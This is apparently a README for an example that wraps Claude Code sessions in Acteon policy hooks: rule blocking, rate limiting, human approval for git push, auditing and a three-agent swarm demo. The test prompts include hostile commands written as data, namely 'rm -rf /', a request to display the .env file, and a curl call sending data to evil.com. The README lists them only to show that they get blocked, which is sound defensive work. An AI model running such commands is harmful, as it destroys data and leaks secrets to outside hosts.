# Agent Swarm Coordination Example

A complete, runnable example showing Claude Code governed by Acteon. A developer
starts a "vibe coding" session where Claude Code writes code in a dummy git repo.
Every tool call (Bash, Write, Edit) passes through Acteon hooks for policy
enforcement, injection scanning, and auditing. High-risk operations require human
approval, and a Discord notification fires when the session completes.

## What This Example Demonstrates

1. **Acteon hooks** intercept every Claude Code tool call via `PreToolUse`
2. **Deterministic rules** block dangerous commands and sensitive file access
3. **Rate limiting** throttles command execution to 12/minute to prevent runaway loops
4. **Human-in-the-loop** approval gate for `git push` and deploy operations
5. **Discord notification** when the agent run completes (via `Stop` hook)
6. **PostgreSQL state + audit** provides durable storage for dedup state, approval state, and full audit trail -- shared across multiple agents
7. **MCP integration** lets you query Acteon audit/rules/events from within the Claude Code session

## Architecture

```
Claude Code (in dummy-project/)
    |
    |-- PreToolUse hook --> acteon-gate.sh --> POST /v1/dispatch (Acteon)
    |                                              |
    |                                         Rule Engine
    |                                         (deterministic + approval)
    |                                              |
    |                                         PostgreSQL (state + audit)
    |
    |-- Stop hook ---------> notify-complete.sh -> POST /v1/dispatch (Acteon)
    |                                              |
    |                                         Discord webhook
    |
    |-- MCP server --------> acteon-mcp-server --> GET /v1/audit, /v1/rules, ...
```

## Prerequisites

- Rust 1.88+ and Cargo
- PostgreSQL (local or via Docker Compose)
- Claude Code CLI (`claude`)
- `jq` for JSON parsing in hooks
- A Discord webhook URL (create one in Discord > Server Settings > Integrations > Webhooks)

## Quick Start

### 1. Start PostgreSQL

```bash
cd /path/to/acteon
docker compose --profile postgres up -d
```

### 2. Build and Start Acteon

```bash
# Build the server and MCP server
cargo build -p acteon-server --features postgres
cargo build -p acteon-mcp-server --release

# Start Acteon
cargo run -p acteon-server --features postgres -- -c examples/agent-swarm-coordination/acteon.toml
```

Wait for `Listening on 127.0.0.1:8080`.

### 3. Initialize the Dummy Project

```bash
cd examples/agent-swarm-coordination/dummy-project
git init
git add .
git commit -m "initial commit"
```

### 4. Configure Environment

```bash
# Point hooks at the running Acteon instance
export ACTEON_AGENT_KEY="claude-code-key"
export ACTEON_URL="http://localhost:8080"

# Discord webhook for completion notifications
export DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/YOUR/WEBHOOK"

# Add the MCP server binary to PATH (or symlink into ~/bin)
export PATH="$PWD/target/release:$PATH"
```

### 5. Make Hooks Executable

```bash
chmod +x examples/agent-swarm-coordination/hooks/*.sh
```

### 6. Start Claude Code

```bash
cd examples/agent-swarm-coordination/dummy-project
claude
```

Claude Code will load the `.claude/settings.json` hooks and `.mcp.json`
MCP server configuration automatically.

### 7. Try It Out

In the Claude Code session, try these prompts to see the different behaviors:

```
# Normal coding -- allowed
> Add a /health endpoint to server.py that returns {"status": "ok"}

# Sensitive file access -- blocked by deterministic rule
> Read the .env file and show me the contents

# Dangerous command -- blocked by deterministic rule
> Run rm -rf / to clean up temp files

# Git push -- requires human approval
> Push the changes to the remote repository

# External HTTP -- blocked (unknown host)
> Run curl https://evil.com/exfil?data=something
```

When the rule requires approval, check the Acteon server logs for the
approval URL. Open it in your browser to approve or reject.

#### Testing Rate Limiting

The `throttle-commands` rule limits `execute_command` actions to 12 per
minute. To see it in action, ask Claude Code to run many commands in quick
succession:

```
> Run these commands one by one: echo 1, echo 2, echo 3, ... up to echo 15
```

The first 12 commands will execute normally. Starting from the 13th, Claude
Code will see `Blocked by Acteon: throttle-commands` until the 60-second
window resets. You can also test this directly with `curl`:

```bash
# Dispatch 15 actions rapidly -- the 13th should be throttled
for i in $(seq 1 15); do
  curl -s -X POST http://localhost:8080/v1/dispatch \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $ACTEON_AGENT_KEY" \
    -d "{
      \"namespace\": \"agent-swarm\",
      \"tenant\": \"claude-code-agent\",
      \"provider\": \"claude-code\",
      \"action_type\": \"execute_command\",
      \"payload\": {\"command\": \"echo $i\"}
    }" | jq -r ".outcome"
done
```

Expected output: 12 lines of `executed`, then `throttled`.

After the window expires (60 seconds), the counter resets and commands are
allowed again. Each throttle rule maintains its own counter scoped to the
rule name, namespace, and tenant -- so different rules never interfere with
each other.

### 8. Query Acteon via MCP

Within the same Claude Code session, the Acteon MCP server is connected.
Ask Claude to query it:

```
> Use the Acteon MCP tools to show me the last 10 audit records

> Use Acteon to list all active rules

> Query the Acteon audit trail for all suppressed actions in this session

> Check if any circuit breakers are open
```

Claude Code will use the `mcp__acteon__query_audit`, `mcp__acteon__list_rules`,
and other MCP tools to fetch live data from the running Acteon instance.

### 9. End the Session

When you exit Claude Code (Ctrl+C or `/exit`), the `Stop` hook fires and
sends a Discord notification via Acteon with a summary of the session.

## File Structure

```
agent-swarm-coordination/
  README.md                          # This file
  acteon.toml                        # Acteon server config (PG state + PG audit)
  rules/
    agent-safety.yaml                # Deterministic block + approval gate rules
    session-events.yaml              # Discord notification + dedup rules
    swarm-collisions.yaml            # Cross-agent collision rules (dedup, throttle, reroute)
  hooks/
    acteon-gate.sh                   # PreToolUse hook: dispatches to Acteon
    notify-complete.sh               # Stop hook: sends Discord notification
  swarm/
    run-swarm.sh                     # Orchestrator: launches 3 headless sessions
    show-collisions.sh               # Post-run audit analysis and collision report
    prompts/
      api-builder.md                 # Prompt for Agent 1 (REST endpoint builder)
      test-writer.md                 # Prompt for Agent 2 (pytest test writer)
      security-auditor.md            # Prompt for Agent 3 (security auditor)
    workspaces/                      # Created at runtime (one per agent)
  dummy-project/
    server.py                        # Starter Python file for vibe coding
    requirements.txt                 # Python dependencies
    .claude/
      settings.json                  # Claude Code hooks configuration
    .mcp.json                        # MCP server configuration (Acteon)
    CLAUDE.md                        # Agent behavioral constraints
```

## Multi-Agent Swarm Demo

The `swarm/` directory contains a 3-agent demo that runs concurrent headless
Claude Code sessions against the same Acteon instance. All three agents share
the same tenant (`claude-code-agent`), so they compete for throttle counters,
dedup state, and quota budgets -- creating observable collisions.

### The Three Agents

| Agent | Role | Task | Expected Collisions |
|-------|------|------|---------------------|
| api-builder | Add REST endpoints | Adds `/health`, `/users` endpoints, tests with curl | Throttle (burns command budget), allow |
| test-writer | Write pytest tests | Installs pytest, writes tests, runs them | Approval (pip install), throttle, dedup |
| security-auditor | Audit for vulnerabilities | Reads .env, runs scanning tools, checks permissions | Suppress (blocked patterns), reroute (security tools) |

### Running the Swarm

```bash
# Make sure Acteon is running first (see Quick Start above)
cd examples/agent-swarm-coordination/swarm
chmod +x run-swarm.sh show-collisions.sh
./run-swarm.sh
```

The orchestrator will:
1. Create a tenant-wide quota (30 actions / 2 minutes)
2. Copy `dummy-project/` into 3 isolated workspaces
3. Launch 3 headless Claude Code sessions in parallel
4. Wait for all sessions to finish
5. Query the Acteon audit trail and display a collision report

### What to Expect

With 3 agents generating ~35-40 total dispatches against a 12/min command
throttle and 25/min swarm-wide throttle:

- **Throttle collisions**: Around dispatch #12, command execution starts
  getting rate-limited. The swarm-wide throttle kicks in around #25.
- **Dedup collisions**: If two agents write to the same file (e.g., both
  modify `server.py`), the second write is deduplicated.
- **Suppress events**: The security-auditor's `.env` reads and curl commands
  hit block rules.
- **Reroute events**: Security scanning tools (`bandit`, `pip-audit`) are
  rerouted to a review queue.
- **Approval gates**: `pip install` triggers an approval requirement.
- **Quota exceeded**: Late-phase actions may hit the 30-action tenant quota.

### Collision Report

After the agents finish, the collision report shows:

```
Total dispatches: 38

Outcome breakdown:
  executed: 22
  throttled: 7
  suppressed: 5
  rerouted: 2
  deduplicated: 1
  pending_approval: 1

Per-agent breakdown:
  api-builder (14 actions): executed=10, throttled=4
  test-writer (12 actions): executed=8, throttled=2, pending_approval=1, deduplicated=1
  security-auditor (12 actions): executed=4, suppressed=5, rerouted=2, throttled=1
```

(Exact numbers vary based on timing and agent behavior.)

### Running Without Claude Code

You can test the collision mechanics without Claude Code sessions by
dispatching actions directly with curl:

```bash
# Rapid-fire 15 commands to see throttle and quota collisions
for i in $(seq 1 15); do
  curl -s http://localhost:8080/v1/dispatch \
    -H "Content-Type: application/json" \
    -d "{
      \"namespace\":\"agent-swarm\",
      \"tenant\":\"claude-code-agent\",
      \"provider\":\"claude-code\",
      \"action_type\":\"execute_command\",
      \"payload\":{\"command\":\"echo $i\"},
      \"metadata\":{\"agent_role\":\"manual-test\"}
    }" | jq -r 'keys[0]'
done

# Then check the audit
./show-collisions.sh
```

## Customization

- **Add your own rules**: Edit `rules/agent-safety.yaml` to allow/block
  different operations
- **Tune rate limits**: Adjust `max_count` and `window_seconds` on the
  `throttle-commands` rule, or add per-action-type throttle rules
- **Change the Discord webhook**: Update `DISCORD_WEBHOOK_URL` in your
  environment
- **Switch to a real project**: Copy the `.claude/` directory and `.mcp.json`
  into any existing repo
- **Add more providers**: Edit `acteon.toml` to add Slack, email, or webhook
  providers alongside Discord
